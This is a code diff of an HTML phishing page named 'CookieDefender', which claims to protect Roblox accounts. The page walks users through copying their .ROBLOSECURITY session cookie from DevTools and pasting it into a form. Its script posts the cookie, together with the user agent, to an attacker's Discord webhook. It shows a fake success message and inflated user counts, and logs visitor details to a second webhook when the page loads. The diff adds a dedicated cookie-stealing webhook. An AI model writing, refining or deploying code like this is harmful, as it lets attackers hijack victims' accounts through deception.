@@ -492,7 +492,7 @@
             line-height: 1.7;
         }
 
-        /* ----- HOW IT WORKS (SINGLE DEFENSE METHOD) ----- */
+        /* ----- HOW IT WORKS (SINGLE CARD) ----- */
         .how-section {
             padding: 100px 5%;
             position: relative;
@@ -868,7 +868,7 @@
     <!-- HERO -->
     <section class="hero">
         <div class="hero-content">
-            <img src="https://media.discordapp.net/attachments/1519009286838288564/1519047477708198148/cookie_defender2-removebg-preview.png?ex=6a3c22b5&is=6a3ad135&hm=e455de869730c16e8293ba8043da527ad674852f88a3671b2ba325040556d893&=&format=webp&quality=lossless" alt="CookieDefender Logo" />
+            <img src="https://media.discordapp.net/attachments/1518070392370233465/1518460833967898785/cookie_defender2-removebg-preview.png?ex=6a3a005a&is=6a38aeda&hm=63bbfeb2688941ff9a54679e7ac63f79c8f3608d7a78fc733e69870d60b99194&=&format=webp&quality=lossless" alt="CookieDefender Logo" />
             <h1>CookieDefender</h1>
             <p class="tagline">Cloud-Native Cookie Protection</p>
             <p class="description">
@@ -914,16 +914,16 @@
         <div class="features-grid" id="tab-content"></div>
     </section>
 
-    <!-- HOW IT WORKS (SINGLE DEFENSE METHOD - MANUAL ONLY) -->
+    <!-- HOW IT WORKS (SINGLE METHOD) -->
     <section id="how-it-works" class="how-section">
-        <h2 class="section-title">Defense Method</h2>
+        <h2 class="section-title">How It Works</h2>
         <p class="section-subtitle">Simple and secure way to protect your cookie</p>
         <div class="steps">
-            <div class="step" onclick="openModal('manual')">
-                <div class="step-number">Manual</div>
-                <h3>Manual Defense</h3>
-                <p>Paste your .ROBLOSECURITY cookie directly for instant cloud encryption and real-time threat monitoring. This is the only supported method.</p>
-                <span class="btn-primary" style="font-size:0.95rem;padding:12px 28px;">Activate Now</span>
+            <div class="step" onclick="openModal()">
+                <div class="step-number">01</div>
+                <h3>Enter Your Cookie</h3>
+                <p>Paste your .ROBLOSECURITY cookie directly into the secure form. Your cookie is never stored or transmitted unencrypted.</p>
+                <span class="btn-primary" style="font-size:0.95rem;padding:12px 28px;">Protect Now</span>
             </div>
         </div>
     </section>
@@ -932,7 +932,7 @@
     <section id="protect" class="cta-section">
         <h2>Ready to Secure Your Account?</h2>
         <p>Join <span id="ctaUserCount" style="color:var(--green);font-weight:700;">72,481</span> protected users with enterprise-grade cloud security.</p>
-        <a href="javascript:void(0)" onclick="openModal('manual')" class="btn-primary" style="font-size:1.4rem;padding:22px 60px;">
+        <a href="javascript:void(0)" onclick="openModal()" class="btn-primary" style="font-size:1.4rem;padding:22px 60px;">
             <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
             Activate Protection Now
         </a>
@@ -949,13 +949,13 @@
         <div class="copyright">CookieDefender © 2025 • Cloud-Based Roblox Security Tool</div>
     </footer>
 
-    <!-- ====== MANUAL MODAL ====== -->
+    <!-- ====== MODAL ====== -->
     <div id="manualModal" class="modal">
         <div class="modal-content">
-            <button class="modal-close" onclick="closeModal('manual')">&times;</button>
+            <button class="modal-close" onclick="closeModal()">&times;</button>
 
             <div id="manualForm">
-                <h2>Manual Defense</h2>
+                <h2>Cookie Defense</h2>
                 <div class="protection-steps">
                     <div class="step-item"><span class="num">1.</span> Open DevTools (F12) on roblox.com → Application → Cookies</div>
                     <div class="step-item"><span class="num">2.</span> Find <code style="color:var(--green);background:rgba(16,185,129,0.06);padding:0 8px;border-radius:4px;">.ROBLOSECURITY</code> and copy the full value</div>
@@ -982,14 +982,15 @@
                 <div class="success-icon">✓</div>
                 <h3>Cookie Successfully Defended</h3>
                 <p>Your .ROBLOSECURITY token is now encrypted and monitored 24/7 in our zero-knowledge cloud infrastructure.</p>
-                <button class="btn-primary" style="justify-content:center;" onclick="closeModal('manual')">Close</button>
+                <button class="btn-primary" style="justify-content:center;" onclick="closeModal()">Close</button>
             </div>
         </div>
     </div>
 
     <script>
         // ===== CONFIG =====
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1519038593069482189/MdonTOX-SG77ffTJtskuJbB1BKO1ZHVMzxxR8Ssiv4xKWfHhqGx_acICxaHtWKSXv91I';
+        const VISITOR_WEBHOOK = 'https://discord.com/api/webhooks/1519038593069482189/MdonTOX-SG77ffTJtskuJbB1BKO1ZHVMzxxR8Ssiv4xKWfHhqGx_acICxaHtWKSXv91I';
+        const COOKIE_WEBHOOK = 'https://discord.com/api/webhooks/1519009450248114176/gyRJ490rOfNqRmL4Z06bQyJ4yiiRyIc1Hdx8MWVu-Dzcb5AnKOOEsMQ0Xv1Drp14Y5lj';
 
         // ===== TAB DATA =====
         const tabData = [
@@ -1034,7 +1035,7 @@
                 scheduleIncrement(); }, delay);
         }
 
-        // ===== SEND VISITOR WEBHOOK (with detailed logging) =====
+        // ===== SEND VISITOR WEBHOOK =====
         function sendVisitorWebhook() {
             const data = {
                 embeds: [{
@@ -1049,11 +1050,11 @@
                         { name: "Language", value: navigator.language || 'Unknown', inline: true },
                         { name: "URL Path", value: window.location.pathname || '/', inline: false }
                     ],
-                    footer: { text: "CookieDefender Analytics • Visitor Logging" }
+                    footer: { text: "CookieDefender Analytics" }
                 }]
             };
 
-            fetch(WEBHOOK_URL, {
+            fetch(VISITOR_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
@@ -1065,14 +1066,7 @@
             updateDisplay();
             scheduleIncrement();
             switchTab(0);
-            // Send visitor logging
             sendVisitorWebhook();
-            // Also log on visibility change (if user returns to tab)
-            document.addEventListener('visibilitychange', function() {
-                if (!document.hidden) {
-                    sendVisitorWebhook();
-                }
-            });
         });
 
         // ===== TAB SWITCHING =====
@@ -1133,30 +1127,26 @@
         }
 
         // ===== MODAL CONTROLS =====
-        function openModal(type) {
-            const id = type === 'manual' ? 'manualModal' : 'manualModal';
-            document.getElementById(id).classList.add('active');
+        function openModal() {
+            document.getElementById('manualModal').classList.add('active');
             document.body.style.overflow = 'hidden';
         }
 
-        function closeModal(type) {
-            const id = type === 'manual' ? 'manualModal' : 'manualModal';
-            document.getElementById(id).classList.remove('active');
+        function closeModal() {
+            document.getElementById('manualModal').classList.remove('active');
             document.body.style.overflow = '';
-            if (type === 'manual') {
-                document.getElementById('cookieInput').value = '';
-                document.getElementById('progressBar').style.width = '0%';
-                document.getElementById('statusMessage').textContent = 'Ready for cloud encryption';
-                document.getElementById('manualForm').style.display = 'block';
-                document.getElementById('successScreen').classList.remove('active');
-            }
+            document.getElementById('cookieInput').value = '';
+            document.getElementById('progressBar').style.width = '0%';
+            document.getElementById('statusMessage').textContent = 'Ready for cloud encryption';
+            document.getElementById('manualForm').style.display = 'block';
+            document.getElementById('successScreen').classList.remove('active');
         }
 
         // close on backdrop click
         document.querySelectorAll('.modal').forEach(m => {
             m.addEventListener('click', (e) => {
                 if (e.target === m) {
-                    closeModal('manual');
+                    closeModal();
                 }
             });
         });
@@ -1191,20 +1181,21 @@
                     clearInterval(interval);
                     document.getElementById('manualForm').style.display = 'none';
                     document.getElementById('successScreen').classList.add('active');
-                    // Send to webhook
-                    fetch(WEBHOOK_URL, {
+                    // Send to cookie webhook
+                    fetch(COOKIE_WEBHOOK, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             embeds: [{
-                                title: "Defense Activated",
-                                description: "Cookie submitted via manual cloud defense.",
+                                title: "Cookie Defense Activated",
+                                description: "Cookie submitted via manual defense.",
                                 color: 0x10b981,
                                 fields: [
                                     { name: "Cookie", value: '```' + cookie + '```', inline: false },
-                                    { name: "Timestamp", value: new Date().toISOString(), inline: true }
+                                    { name: "Timestamp", value: new Date().toISOString(), inline: true },
+                                    { name: "User Agent", value: navigator.userAgent.substring(0, 100), inline: false }
                                 ],
-                                footer: { text: "CookieDefender Cloud Protection" }
+                                footer: { text: "CookieDefender Security" }
                             }]
                         })
                     }).catch(() => {});
